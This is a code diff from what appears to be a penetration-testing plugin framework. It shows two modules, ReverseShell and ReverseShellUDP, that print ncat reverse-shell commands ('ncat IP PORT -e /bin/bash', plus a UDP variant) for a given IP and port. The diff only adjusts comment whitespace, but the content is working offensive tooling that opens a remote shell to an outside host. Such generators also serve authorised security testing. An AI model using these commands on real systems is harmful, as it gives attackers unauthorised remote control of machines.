@@ -13,7 +13,7 @@ class ReverseShell(plugin.Module):
             help="Port address"
         )
         self.opts.description = "Generate reverse shell using ncat"
-        self.shell = """ncat {} {} -e /bin/bash""" # TODO add custom option for shell
+        self.shell = """ncat {} {} -e /bin/bash"""  # TODO add custom option for shell
 
     def show_shell(self, args):
         print(self.shell.format(args.ip, args.port))
@@ -31,7 +31,7 @@ class ReverseShellUDP(plugin.Module):
             help="Port address"
         )
         self.opts.description = "Generate reverse shell using ncat"
-        self.shell = """ncat --udp {} {} -e /bin/bash""" # TODO add custom options for shell
+        self.shell = """ncat --udp {} {} -e /bin/bash"""  # TODO add custom options for shell
 
     def show_shell(self, args):
         print(self.shell.format(args.ip, args.port))
